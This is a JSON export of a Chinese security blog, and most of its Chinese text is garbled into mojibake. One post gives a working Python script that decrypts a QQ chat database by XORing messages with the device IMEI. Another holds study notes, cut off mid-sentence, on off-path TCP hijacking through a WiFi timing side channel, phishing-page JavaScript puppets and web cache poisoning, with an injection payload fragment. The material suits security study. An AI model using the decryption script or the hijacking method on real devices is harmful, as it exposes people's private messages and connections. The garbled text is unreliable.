å¯†æ•°æ®è·å–ï¼šDENGTA_META.xmlâ€”IMEI:867179032952446databases/2685371834.dbâ€”â€”æ•°æ®åº“æ–‡ä»¶ è§£å¯†æ–¹å¼ï¼šæ˜æ–‡msg_t å¯†æ–‡msg_Data keyï¼šIMEImsg_t = msg_Data[i]^IMEI[i%15] å®éªŒï¼š123456789101112131415161718192021222324import sqlite3IMEI = &apos;867179032952446&apos;conn = sqlite3.connect(&apos;2685371834.db&apos;)c = conn.cursor()def _decrypt(foo): substr = &apos;&apos; #print(len(foo)) for i in range(0,len(foo)): substr += chr(ord(foo[i]) ^ ord(IMEI[i%15])) return substr#rem = c.execute(&quot;SELECT uin, remark, name FROM Friends&quot;)Msg = c.execute(&quot;SELECT msgData, senderuin, time FROM mr_friend_0FC9764CD248C8100C82A089152FB98B_New&quot;)for msg in Msg: uid = _decrypt(msg[1]) print(&quot;\\n&quot;+uid+&quot;:&quot;) try: msgData = _decrypt(msg[0]).decode(&apos;utf-8&apos;) print(msgData) except: pass ç»“æœ","categories":[{"name":"åŠ å¯†è§£å¯†","slug":"åŠ å¯†è§£å¯†","permalink":"https://cool-y.github.io/categories/åŠ å¯†è§£å¯†/"}],"tags":[{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://cool-y.github.io/tags/å¯†ç /"},{"name":"QQ","slug":"QQ","permalink":"https://cool-y.github.io/tags/QQ/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://cool-y.github.io/tags/æ•°æ®åº“/"}]},{"title":"wifiåŠåŒå·¥ä¾§ä¿¡é“æ”»å‡»å­¦ä¹ ç¬”è®°","slug":"wifiåŠåŒå·¥ä¾§ä¿¡é“æ”»å‡»å­¦ä¹ ç¬”è®°","date":"2019-01-16T07:35:27.000Z","updated":"2021-04-10T13:51:18.277Z","comments":true,"path":"2019/01/16/wifiåŠåŒå·¥ä¾§ä¿¡é“æ”»å‡»å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://cool-y.github.io/2019/01/16/wifiåŠåŒå·¥ä¾§ä¿¡é“æ”»å‡»å­¦ä¹ ç¬”è®°/","excerpt":"","text":"TCPä¾§ä¿¡é“åˆ†æåŠåˆ©ç”¨çš„å­¦ä¹ æŠ¥å‘Šè®ºæ–‡æ¥æºï¼šUSENIX SECURITY 2018ï¼šOff-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secretsä¸‹è½½ï¼šåŸæ–‡pdfä¸­æ–‡slides èƒŒæ™¯çŸ¥è¯†æµ‹ä¿¡é“é¦™å†œä¿¡æ¯è®º ä»€ä¹ˆæ˜¯ä¿¡æ¯ï¼Ÿ ç”¨æ¥å‡å°‘éšæœºä¸ç¡®å®šçš„ä¸œè¥¿ ä»€ä¹ˆæ˜¯åŠ å¯†ï¼Ÿ ç±»ä¼¼äºåŠ å™ªå£°ï¼Œå¢åŠ éšæœºä¸ç¡®å®šæ€§ â€œä»å¯†ç åˆ†æè€…æ¥çœ‹ï¼Œä¸€ä¸ªä¿å¯†ç³»ç»Ÿå‡ ä¹å°±æ˜¯ä¸€ä¸ªé€šä¿¡ç³»ç»Ÿã€‚å¾…ä¼ çš„æ¶ˆæ¯æ˜¯ç»Ÿè®¡äº‹ä»¶ï¼ŒåŠ å¯†æ‰€ç”¨çš„å¯†é’¥æŒ‰æ¦‚ç‡é€‰å‡ºï¼ŒåŠ å¯†ç»“æœä¸ºå¯†æŠ¥ï¼Œè¿™æ˜¯åˆ†æè€…å¯ä»¥åˆ©ç”¨çš„ï¼Œç±»ä¼¼äºå—æ‰°ä¿¡å·ã€‚â€ ä¾§ä¿¡é“éšä¹‹å‡ºç° è¶Šè¿‡åŠ å¯†ç®—æ³•å¢åŠ çš„éšæœºä¸å®šæ€§ï¼Œä»å…¶ä»–çš„æ¸ é“è·å–æ•°æ®æ ‡ç­¾ï¼Œç¡®å®šä¿¡æ¯å†…å®¹ã€‚ æ—©æœŸï¼šé‡‡é›†åŠ å¯†ç”µå­è®¾å¤‡åœ¨è¿è¡Œè¿‡ç¨‹ä¸­çš„æ—¶é—´æ¶ˆè€—ã€åŠŸç‡æ¶ˆè€—æˆ–è€…ç”µç£è¾å°„æ¶ˆè€—ç­‰è¾¹ç¼˜ä¿¡æ¯çš„å·®å¼‚æ€§ è€Œéšç€ç ”ç©¶çš„æ·±å…¥ï¼Œé€æ¸ä»åŠ å¯†è®¾å¤‡å»¶ä¼¸åˆ°è®¡ç®—æœºå†…éƒ¨CPUã€å†…å­˜ç­‰ä¹‹é—´çš„ä¿¡æ¯ä¼ é€’ å¹¶åœ¨Webåº”ç”¨äº¤äº’ä¿¡æ¯ä¼ é€’è¶Šæ¥è¶Šé¢‘ç¹æ—¶ï¼Œå»¶ä¼¸åˆ°äº†ç½‘ç»œåŠ å¯†æ•°æ®æµçš„ç ´è§£æ–¹é¢ ä¾§ä¿¡é“æ”»å‡»çš„æµç¨‹ ç¬¬ä¸€ä¸ªå°±æ˜¯ä¾§ä¿¡é“æ³„éœ²çš„æˆªå–ï¼Œç¬¬äºŒä¸ªæ˜¯ä¿¡æ¯çš„æ¢å¤ã€‚ ç½‘ç»œæ”»å‡» ä¸­é—´äººæ”»å‡» â€œæŒ‡æ”»å‡»è€…ä¸é€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿æ¥ä¸å¯¹æ–¹ç›´æ¥å¯¹è¯ï¼Œä½†äº‹å®ä¸Šæ•´ä¸ªä¼šè¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æ§åˆ¶ã€‚â€ å…¬å…±wifiã€è·¯ç”±å™¨åŠ«æŒ ä¸€èˆ¬ä½¿ç”¨åŠ å¯†æ¥é˜²å¾¡ åŠ å¯†çš„ä»£ä»·ï¼šç»´æŠ¤å¯†é’¥è¯ä¹¦ã€å½±å“åŠŸèƒ½ï¼ˆè¿è¥å•†æ— æ³•åšç¼“å­˜ï¼‰ éä¸­é—´äººæ”»å‡»/åç¦»è·¯å¾„æ”»å‡»/off-path attack é€šä¿¡çº¿è·¯ä¹‹å¤–ï¼Œæ”»å‡»è€…çœ‹ä¸åˆ°åŒæ–¹çš„æ¶ˆæ¯ï¼Œæ²¡åŠæ³•æˆªè·å’Œå‘é€é€šä¿¡åŒ…ã€‚æ™ºèƒ½ä¼ªé€ æˆä¸€æ–¹ç»™å¦ä¸€æ–¹å‘æ¶ˆæ¯ã€‚ æ”»å‡»æˆåŠŸéœ€è¦ï¼šæ¶ˆæ¯åˆæ³•+æœ€å…ˆåˆ°è¾¾ é˜²å¾¡æªæ–½ï¼šchallenge-response/è¯¢é—®-åº”ç­”æœºåˆ¶åŒæ–¹åœ¨é€šä¿¡å‰äº¤æ¢ä¸€ä¸ªéšæœºæ•°ï¼Œè¿™ä¸ªéšæœºæ•°åœ¨æ¯æ¬¡çš„é€šä¿¡ä¸­éƒ½è¦è¢«é™„å¸¦ï¼Œè€Œä¸­é—´äººçœ‹ä¸è§è¿™ä¸ªéšæœºæ•°ï¼Œå› æ­¤ä¼ªé€ çš„æ¶ˆæ¯è¢«è®¤ä¸ºä¸åˆæ³•ã€‚ æ”»å‡»è€…å¦‚ä½•å¾—åˆ°è¿™ä¸ªéšæœºæ•°ï¼šä¾§ä¿¡é“ TCPä¸‰æ¬¡æ¡æ‰‹ å®¢æˆ·ç«¯é€šè¿‡å‘æœåŠ¡å™¨ç«¯å‘é€ä¸€ä¸ªSYNæ¥åˆ›å»ºä¸€ä¸ªä¸»åŠ¨æ‰“å¼€ï¼Œä½œä¸ºä¸‰è·¯æ¡æ‰‹çš„ä¸€éƒ¨åˆ†ã€‚å®¢æˆ·ç«¯æŠŠè¿™æ®µè¿æ¥çš„åºå·è®¾å®šä¸ºéšæœºæ•°Aã€‚ æœåŠ¡å™¨ç«¯åº”å½“ä¸ºä¸€ä¸ªåˆæ³•çš„SYNå›é€ä¸€ä¸ªSYN/ACKã€‚ACKçš„ç¡®è®¤ç åº”ä¸ºA+1ï¼ŒSYN/ACKåŒ…æœ¬èº«åˆæœ‰ä¸€ä¸ªéšæœºäº§ç”Ÿçš„åºå·Bã€‚ æœ€åï¼Œå®¢æˆ·ç«¯å†å‘é€ä¸€ä¸ªACKã€‚å½“æœåŠ¡ç«¯æ”¶åˆ°è¿™ä¸ªACKçš„æ—¶å€™ï¼Œå°±å®Œæˆäº†ä¸‰è·¯æ¡æ‰‹ï¼Œå¹¶è¿›å…¥äº†è¿æ¥åˆ›å»ºçŠ¶æ€ã€‚æ­¤æ—¶åŒ…çš„åºå·è¢«è®¾å®šä¸ºæ”¶åˆ°çš„ç¡®è®¤å·A+1ï¼Œè€Œå“åº”å·åˆ™ä¸ºB+1ã€‚ é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹ï¼Œç¡®å®šå¯¹æ–¹ä¸æ˜¯éä¸­é—´äºº TCPåºåˆ—å·çš„é—®é¢˜ 1985 1995 2001 2004 2007 2012 2012 2016 Morris Mitnik Zalewsky Waston kLM Herzberg ä½œè€… ä½œè€… åˆå§‹åºåˆ—å¯é¢„æµ‹ çœŸå®åˆ©ç”¨ æ¼æ´ä»åœ¨ BGP DoS Windowsæ”»å‡» Puppet-assisted Malware-assisted off-path attack 90å¹´ä»£æ—¶å‘ç°å¹¶ä¸éšæœºï¼š1995å¹´ä¼ªé€ å®¢æˆ·ç«¯è¿æ¥å¾®è½¯å¤§æ¥¼çš„æœåŠ¡å™¨ 2007å¹´åœ¨windowsåœºæ™¯ä¸‹ç”¨IDIDä¾§ä¿¡é“çŒœå‡ºåºåˆ—å·ï¼šåªé’ˆå¯¹Windowsï¼ŒèŠ±è´¹å‡ å°æ—¶ Malware-assistedæ”»å‡»æ¨¡å‹ï¼šç»™å—å®³è€…å®‰è£…ä¸€ä¸ªæ— ç‰¹æƒçš„åº”ç”¨ç¨‹åºï¼ˆä»…èƒ½ç½‘ç»œè¿æ¥ï¼‰ï¼Œè¿™ä¸ªç¨‹åºè·Ÿéä¸­é—´äººçš„æ”»å‡»è€…é‡Œåº”å¤–åˆï¼ŒåŠ«æŒæ‰‹æœºä¸Šæ‰€æœ‰çš„TCPè¿æ¥ã€‚ å¦‚ä½•åŠ«æŒTCP éœ€è¦çš„ä¿¡æ¯ï¼šFacebookçš„è¿æ¥IPåœ°å€å’Œç«¯å£å·ï¼Œç”±æ­¤å¯ä»¥çŸ¥é“TCPè¿æ¥çš„åºåˆ—å·ï¼Œåˆ©ç”¨åºåˆ—å·ä¼ªè£…æˆFacebookç»™æ‰‹æœºå‘æ¶ˆæ¯ã€‚ä½¿ç”¨netstatå‘½ä»¤è·å–ï¼š ä»»åŠ¡ï¼šç”±äºTCPçš„åºåˆ—å·é€šå¸¸è¿ç»­ï¼Œæ‰€ä»¥è¦ç²¾ç¡®çŒœåˆ°å®ƒçš„ä¸‹ä¸€ä¸ªåºåˆ—å·ã€‚ å¦‚ä½•éªŒè¯åºåˆ—å·æ­£ç¡®ï¼šé€šè¿‡æŸç§ä¾§ä¿¡é“ï¼Œè¿™ä¸ªæ¶æ„è½¯ä»¶åœ¨åå°å¯ä»¥æä¾›åé¦ˆã€‚ å˜ç§ä¸€ï¼šé˜²ç«å¢™æ”»å‡»è¿‡ç¨‹ï¼š TCPä¸‰æ¬¡æ¡æ‰‹ä¹‹åäº§ç”ŸAå’ŒBï¼Œå°†æ¥ä¼ è¾“çš„åŒ…åºåˆ—å·å¿…é¡»è·ŸAå’ŒBå¾ˆæ¥è¿‘ï¼Œå¦åˆ™ï¼Œé˜²ç«å¢™ä¼šä¸¢å¼ƒè¿™ä¸ªåŒ…ã€‚å› æ­¤åªæœ‰çŒœå¯¹äº†åºåˆ—å·ï¼ŒåŒ…æ‰èƒ½åˆ°è¾¾æ‰‹æœºç«¯ã€‚åˆ°è¾¾æ‰‹æœºç«¯åï¼Œåå°çš„æ¶æ„è½¯ä»¶å¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ¤æ–­æ‰‹æœºæ˜¯å¦æ¥å—äº†è¿™ä¸ªæ•°æ®åŒ…ã€‚ å…·ä½“ä¾§ä¿¡é“æ–¹æ¡ˆï¼š CPUèµ„æºä½¿ç”¨ç‡ï¼ˆå™ªéŸ³å¾ˆå¤§ï¼‰â€”â€”&gt;TCPè®¡æ•°å™¨ï¼ˆåå°è½¯ä»¶è¿è¡Œåˆ¶é€ å™ªéŸ³ï¼‰â€”â€”&gt;ä½å™ªéŸ³è®¡æ•°å™¨ï¼šåŒ…è¢«ä¸¢æ‰æ—¶ï¼Œä¸€ä¸ªç›¸åº”çš„é”™è¯¯è®¡æ•°å™¨ã€‚ è§£å†³æ–¹æ³•ï¼š å…³é—­é˜²ç«å¢™æ£€æŸ¥åºåˆ—å·çš„åŠŸèƒ½ å˜ç§äºŒï¼šæ— é˜²ç«å¢™å…·ä½“ä¾§ä¿¡é“æ–¹æ¡ˆï¼šè·ŸTCPä¸šåŠ¡é€»è¾‘æœ‰å…³çš„è®¡æ•°å™¨â€”â€”æ”¶åˆ°çš„TCPåŒ…åºåˆ—å·å°äºæœŸæœ›æ—¶å¢åŠ ï¼Œå¤§äºæ—¶ä¸å˜ã€‚äºŒåˆ†æŸ¥æ‰¾æœç´¢æ­£ç¡®çš„åºåˆ—å·ã€‚å½±å“èŒƒå›´ï¼šAndroidã€Linuxã€MacOSã€FreeBSD Pure off-path:æ— æ¶æ„è½¯ä»¶ååŠ© ä¸æ¤å…¥æ¶æ„è½¯ä»¶ï¼ŒåŠ«æŒä»»æ„ä¸¤å°æœºå™¨çš„TCPè¿æ¥ï¼šé¦–å…ˆç¡®å®šæ˜¯å¦å»ºç«‹TCPè¿æ¥ï¼Œç„¶åæ¨æµ‹å…¶åºåˆ—å·Aå’ŒBã€‚ Global Rate Limit USENIX 2016 : Off-Path TCP Exploits: Global Rate Limit Considered Dangerous ä¾§ä¿¡é“ï¼š æ‰€æœ‰çš„ä¾§ä¿¡é“ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ”»å‡»è€…å’Œå—å®³è€…ä¹‹é—´å…±äº«ç€æŸäº›èµ„æºï¼Œå¦‚ä¹‹å‰çš„å…¨å±€TCPè®¡æ•°å™¨ã€‚è¿™é‡Œä½¿ç”¨çš„ä¾§ä¿¡é“æ˜¯ æœåŠ¡å™¨ä¸Š çš„å…±äº«èµ„æºï¼Œé™é€Ÿå™¨ï¼ˆRFC 5961ï¼‰é™åˆ¶æŸä¸€ç§åŒ…çš„å‘é€é€Ÿç‡ï¼ˆé»˜è®¤100p/sï¼‰ å¦‚ä½•åˆ©ç”¨å…±äº«é™é€Ÿå™¨ï¼šå…ˆåˆ¤æ–­æ˜¯å¦å»ºç«‹äº†è¿æ¥ã€‚ç„¶åä¼ªé€ TCPåŒ…ï¼Œéœ€è¦çŒœæµ‹æºç«¯å£ï¼Œå¦‚æœçŒœæµ‹æ­£ç¡®ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªchallengeï¼Œæ”»å‡»è€…ä¸æ–­è§¦å‘ï¼Œä¸€å…±å¯ä»¥æ”¶åˆ°99ä¸ªï¼ˆè¿˜æœ‰ä¸€ä¸ªå‘ç»™äº†å®¢æˆ·ç«¯ï¼‰ï¼›å¦‚æœçŒœæµ‹é”™è¯¯ï¼Œåˆ™ä¸€å…±å¯ä»¥æ”¶åˆ°100ä¸ªchallengeã€‚ è¯„ä¼°ï¼š æ˜¯å¦å»ºç«‹äº†è¿æ¥ï¼š&lt;10s ; Seqï¼š30s ï¼› ACK:&lt;10s è§£å†³æ–¹æ¡ˆï¼š 1. åŠ å™ªéŸ³ï¼Œ100å˜æˆ150ã€200ï¼›2. é™é€Ÿå™¨åšæˆå±€éƒ¨çš„ Unfixable WiFi timing USENIX 2018 : Off-Path TCP Exploit: How Wireless RoutersCan Jeopardize Your Secretsä¹‹å‰çš„æ¼æ´æ— è®ºæ˜¯è®¡æ•°å™¨è¿˜æ˜¯é™é€Ÿå™¨éƒ½å±äºè½¯ä»¶ï¼Œå¾ˆå¥½æ›´æ­£ï¼Œä½†è¿™ç¯‡æ–‡ç« çš„æ¼æ´åˆ©ç”¨æ— æ³•ä¿®å¤ã€‚ TCPæ”¶åŒ…çš„åŸç†ï¼š é€šå¸¸TCPæ”¶åŒ…è¦çœ‹è¿™ä¸ªåŒ…æ˜¯å¦åŒ¹é…äº†å½“å‰çš„æŸä¸€ä¸ªè¿æ¥ã€‚å¦‚æœè¿æ¥åŒ¹é…ä¸Šäº†ï¼Œå°±ä¼šå»çœ‹è¿™ä¸ªåŒ…çš„åºåˆ—å·ï¼›å¦‚æœåºåˆ—å·ä¸å¯¹ï¼Œä¼šè§¦å‘ä¸€ä¸ªå›å¤ï¼Œè¯´æ˜è¿™ä¸ªåºåˆ—å·å­˜åœ¨é—®é¢˜ï¼›å¦‚æœåºåˆ—å·æ­£ç¡®ï¼Œä½†åå‘åºåˆ—å·ä¸å¯¹ï¼Œä¹Ÿä¼šä¸¢åŒ…ã€‚å½“è¿æ¥åŒ¹é…ã€åºåˆ—å·å’Œåå‘åºåˆ—å·æ­£ç¡®æ—¶ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªæ•°æ®åŒ…ã€‚ ä¾§ä¿¡é“ï¼š æ”»å‡»è€…ä¼ªè£…æˆæœåŠ¡å™¨ç»™å®¢æˆ·ç«¯å‘åŒ…ï¼Œæ­£ç¡®çš„åºåˆ—å·ä¼šæœ‰å›å¤ï¼Œé”™è¯¯åˆ™æ²¡æœ‰ã€‚ä½†å›å¤æ—¶å‘é€ç»™æœåŠ¡å™¨çš„ï¼Œæœ‰æ²¡æœ‰å›å¤æ”»å‡»è€…å¹¶ä¸çŸ¥é“ã€‚é‚£ä¹ˆå¦‚ä½•å»åˆ¤æ–­æœ‰æ²¡æœ‰å›å¤ï¼Œåˆ©ç”¨æ— çº¿ç½‘ç»œçš„ åŠåŒå·¥ ä¼ è¾“ã€‚è®©æœ‰å›åŒ…å’Œæ²¡æœ‰å›åŒ…çš„æ—¶é—´å·®å¼‚æ”¾å¤§ã€‚ åˆ¤æ–­æµç¨‹ï¼š å®¢æˆ·ç«¯å’Œè·¯ç”±å™¨ä¹‹é—´wifié€šä¿¡ã€‚æ”»å‡»è€…ä¾æ¬¡å‘é€ä¸‰ä¸ªæ•°æ®åŒ…ï¼Œç¬¬ä¸€ä¸ªåŒ…ç”¨æ¥æµ‹è¯•æ­£å¸¸çš„RTTã€‚ç¬¬2ä¸ªåŒ…æ˜¯ä¼ªè£…æˆæœåŠ¡å™¨å‘é€çš„ï¼Œå¦‚æœç¬¬2ä¸ªåŒ…çŒœå¯¹äº†ï¼Œå®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨è¿”å›æ•°æ®åŒ…ï¼Œè¿™ä¼šå¯¼è‡´å ç”¨æ›´é•¿æ—¶é—´çš„wifiä¿¡é“ï¼Œä»è€Œä¼šä½¿ç¬¬3ä¸ªåŒ…çš„RTTæ›´é•¿ã€‚ è¯„ä¼°ï¼š åœ¨æœ¬åœ°ç¯å¢ƒä¸‹ï¼Œå¦‚æœå‘é€40ä¸ªåŒ…ï¼Œå°±æœ‰20msçš„RTTå·®åˆ«ã€‚ æ”»å‡»åº”ç”¨ï¼š1. æ”»å‡»æ¨¡å‹ï¼š å—å®³è€…è®¿é—®äº†æˆ‘ä»¬çš„é’“é±¼ç½‘ç«™ï¼Œè¿™æ—¶javascriptï¼ˆå‚€å„¡ï¼‰ä¼šåœ¨åå°æ‰§è¡Œï¼Œä¸»åŠ¨å»ºç«‹åˆ°æ”»å‡»è€…çš„è¿æ¥ï¼ˆè§„é¿NATæˆ–é˜²ç«å¢™é€ æˆçš„ä¸å¯æŠµè¾¾é—®é¢˜ï¼‰ï¼Œè¿™æ—¶æ”»å‡»è€…å°±å¯ä»¥ä»å¤–ç½‘æµ‹è¯•RTTã€‚ ä¸ç†æƒ³æƒ…å†µçš„ä¸åŒï¼šå®¢æˆ·ç«¯é€šå¸¸åœ¨NATæˆ–é˜²ç«å¢™ä¹‹åï¼›æ“ä½œç³»ç»Ÿä¸ä¸€å®šä¸¥æ ¼éµå®ˆTCPæ”¶åŒ…çš„åŸåˆ™ Attacker -------wire----------| Router ---------wireless-------Victim (client) Server -------wire----------| 2. æ”»å‡»ç›®æ ‡ï¼š æ¨æ–­å‡ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ˜¯å¦å»ºç«‹äº†è¿æ¥ï¼›åˆè®¡è¿æ¥ä¸­äº¤æ¢çš„å­—èŠ‚æ•°æˆ–å¼ºåˆ¶ä¸­æ–­è¿æ¥ï¼›æ³¨å…¥æ¶æ„payloadåˆ°è¿æ¥ï¼ˆä¸å¤±ä¸€èˆ¬æ€§çš„å…³æ³¨webç¼“å­˜æŠ•æ¯’ï¼‰ã€‚å‰ä¸¤ä¸ªä¸éœ€è¦å‚€å„¡åˆå§‹åŒ–è¿æ¥ï¼Œç¬¬ä¸‰ä¸ªä¸ä¸€å®šéœ€è¦ï¼Œä½†æ”»å‡»è€…æ§åˆ¶äº†æ—¶åºï¼Œèƒ½å¤Ÿç®€åŒ–æ”»å‡»ã€‚ 3. æ”»å‡»è¿‡ç¨‹ï¼š å‡è®¾å‚€å„¡å·²ç»å»ºç«‹äº†è¿æ¥ï¼Œæ”»å‡»è€…å¯ä»¥åŠ«æŒå¹¶æ›¿æ¢ä»»ä½•ä¸åŠ å¯†çš„ç½‘ç«™ï¼ˆå¦‚æ­¦æ±‰å¤§å­¦ï¼‰ï¼Œå¹¶åœ¨æµè§ˆå™¨ç¼“å­˜ã€‚è¿™æ˜¯å› ä¸ºå½“æµè§ˆå™¨è¯·æ±‚ç›¸åŒçš„ipåœ°å€æ—¶ï¼Œä¼šå¤ç”¨ä¹‹å‰çš„TCPè¿æ¥ã€‚è¿™æ„å‘³ç€æ¶æ„ç½‘ç«™ä¸­çš„å‚€å„¡å¯ä»¥é€šè¿‡é‡å¤HTMLå…ƒç´ æ¥å»ºç«‹åˆ°ç›®æ ‡åŸŸåçš„å•ä¸ªæŒä¹…è¿æ¥ã€‚ç„¶åï¼Œè·¯å¾„å¤–æ”»å‡»è€…å¯ä»¥è¿›è¡Œä¾§ä¿¡é“æ”»å‡»ï¼Œä»¥æ¨æ–­ç›®æ ‡è¿æ¥ä¸­ä½¿ç”¨çš„ç«¯å£å·å’Œåºåˆ—å·ï¼Œç„¶åæ³¨å…¥è™šå‡çš„httpå“åº”ï¼Œå¹¶è¦æ±‚æµè§ˆå™¨ä¸é‡æ–°æ£€æŸ¥å¯¹è±¡çš„æ–°é²œåº¦ï¼Œä»è€Œè¾¾åˆ°æŒç»­æ€§çš„ç¼“å­˜æŠ•æ¯’ã€‚ 4. ç»†èŠ‚ï¼š è¿æ¥ï¼ˆå››å…ƒç»„ï¼‰æ¨æ–­ï¼š æ¯ä¸€è½®ä½¿ç”¨30ä¸ªé‡å¤åŒ…æµ‹è¯•ä¸€ä¸ªç«¯å£ï¼Œå¦‚æœç«¯å£å·æ­£ç¡®ï¼Œå°±ä¼šå‘ç°RTTå¤§å¹…å¢åŠ ã€‚å¦‚æœè¿˜è¦å®Œæˆ webç¼“å­˜æŠ•æ¯’ ï¼Œè¿˜éœ€è¦å‚€å„¡åˆå§‹åŒ–è¿æ¥æ¥ååŠ©ï¼Œæ ¹æ®ç³»ç»Ÿä¸åŒï¼Œæœ‰ä¸åŒçš„ç«¯å£é€‰æ‹©ç®—æ³•å¯ä»¥ä¼˜åŒ–ï¼šwindows&amp;macOS ä½¿ç”¨å…¨å±€å’Œé¡ºåºç«¯å£åˆ†é…ç­–ç•¥ä¸ºå…¶TCPè¿æ¥é€‰æ‹©çŸ­æš‚çš„ç«¯å£å·ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨è§‚å¯Ÿåˆ°ä¸æ¶æ„WebæœåŠ¡å™¨çš„åˆå§‹è¿æ¥åæ¨æ–­å‡ºè¦ä½¿ç”¨çš„ä¸‹ä¸€ä¸ªç«¯å£å·ï¼Œè¿™å®Œå…¨æ¶ˆé™¤äº†å¯¹ç«¯å£å·æ¨æ–­çš„éœ€è¦ã€‚NAT ç«¯å£ä¿ç•™ï¼Œä¸éœ€è¦å…³å¿ƒå¤–éƒ¨ç«¯å£è¢«è½¬æ¢æˆä¸å¯é¢„çŸ¥çš„å†…éƒ¨ç«¯å£ã€‚æ¥è‡ªåŒä¸€åŸŸåçš„å¤šä¸ªIPåœ°å€ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…éœ€è¦ä»˜å‡ºæ›´å¤§çš„ä»£ä»·æ¥æ¨æ–­ç«¯å£å·ã€‚ åºåˆ—å·æ¨æ–­ï¼š é€šè¿‡åˆ©ç”¨æ—¶åºä¾§ä¿¡é“æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„å“åº”ï¼Œä»è€Œå°†çª—å£åºåˆ—å·ä¸çª—å¤–åºåˆ—å·åŒºåˆ†å¼€æ¥ã€‚ä¸€æ—¦æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ª çª—å£å†…åºåˆ—å·ï¼Œé€šè¿‡è¿›è¡ŒäºŒåˆ†æœç´¢è¿›ä¸€æ­¥å°†åºåˆ—å·ç©ºé—´ç¼©å°åˆ°å•ä¸ªå€¼ RCV.NXTã€‚å¦‚æœè¿˜è¦ä½¿ç”¨å‚€å„¡å»ºç«‹çš„è¿æ¥å‘èµ·webç¼“å­˜æŠ•æ¯’ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–ï¼šå¢å¤§æ¥æ”¶çª—å£çš„å¤§å°ï¼Œå¯ä»¥å‡å°‘çŒœæµ‹çš„è¿­ä»£æ¬¡æ•°ï¼Œé€šå¸¸å¯ä»¥æ”¾å¤§åˆ°500000(ä¹‹å‰æ˜¯65535)ï¼Œè€Œä¸”æ ¹æ®RFC793,çª—å£æ”¾å¤§ä¹‹åå°±æ°¸è¿œä¸ä¼šç¼©å°ã€‚ TCPåŠ«æŒï¼š é€šè¿‡åŠ«æŒå‚€å„¡åˆå§‹åŒ–çš„è¿æ¥ï¼Œå¯ä»¥ç®€åŒ–webç¼“å­˜æŠ•æ¯’çš„è¿‡ç¨‹ã€‚ä¸‰ä¸ªosåœ¨ACKéªŒè¯ä¸Šéƒ½ä¸ç¬¦åˆè§„èŒƒï¼Œæ‰€ä»¥å„è‡ªå¤„ç†æƒ…å†µä¹Ÿä¸åŒâ€”â€”windowsï¼šå®¢æˆ·ç«¯å¿…é¡»æŒç»­å‘é€è¯·æ±‚ä»¥é˜²æ­¢ACKæ¥æ”¶çª—å£ä»…ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œè¿™è¦æ±‚æ”»å‡»è€…å¿…é¡»èƒ½å‡†ç¡®é¢„æœŸä¸‹ä¸€ä¸ªåºåˆ—å·å¹¶è§£å†³å¤§é‡æµé‡å¸¦æ¥çš„å™ªå£°ã€‚å› æ­¤ï¼Œä½œè€…è®¾è®¡äº†ä¸€ç§æ–°ç­–ç•¥ï¼Œè¯¥ç­–ç•¥åˆ©ç”¨å¤„ç†é‡å æ•°æ®çš„TCPè¡Œä¸ºå’Œå¤„ç†æŸåçš„HTTPå“åº”çš„æµè§ˆå™¨è¡Œä¸ºâ€”â€”åœ¨Windowsä¸»æœºä¸Šç¼“å†²çš„æ”»å‡»è€…æ³¨å…¥æ•°æ®å¯èƒ½ä¼šç ´åæ¥è‡ªæœåŠ¡å™¨çš„çœŸå®HTTPå“åº”ã€‚ ï¼ˆ1ï¼‰æ³¨å…¥ï¼Œå‚€å„¡ä¸æ–­ä»æœåŠ¡å™¨ä¸Šè¯·æ±‚è„šæœ¬ï¼Œè€Œæ”»å‡»è€…å‘é€2^23/|wnd|ä¸ªæ¬ºéª—æ€§æ•°æ®åŒ…ï¼Œè¿™äº›åŒ…çš„çª—å£åºåˆ—å·ä¸RCV.NXTåŠ ä¸Šåç§»é‡ç›¸åŒ¹é…ï¼Œå…¶ä¸­|wnd|ä¸ºackæ¥æ”¶çª—å£å¤§å°ï¼Œç¬¬iä¸ªæ•°æ®åŒ…çš„ACKå·ä¸ºi*|wnd|ï¼Œpayloadä¸º 1websocket.send(|wnd|*i) å› æ­¤ï¼Œè¿™äº›æ•°æ®åŒ…ä¸­åŒ…å«æœ‰æ•ˆACKå·çš„ä¸€ä¸ªåŒ…å°†è¢«ç¼“å†²ï¼Œå¹¶ç ´åçœŸå®çš„HTTPå“åº”å¤´ã€‚æµè§ˆå™¨æ‰§è¡Œæ³¨å…¥çš„è„šæœ¬æ—¶ï¼Œå®ƒå°†é€šè¿‡websocketå‘é€çŒœæµ‹çš„ACKå·ï¼Œæä¾›æœ‰æ•ˆçš„çª—å£å†…ACKå·ã€‚ï¼ˆ2ï¼‰åˆ©ç”¨ï¼Œç”±äºå®¢æˆ·ç«¯å·²ç»æ¥å—äº†é¢å¤–çš„æ¬ºéª—payloadï¼Œæ¨è¿›äº†å…¶é¢„æœŸçš„åºåˆ—å·ï¼Œå› 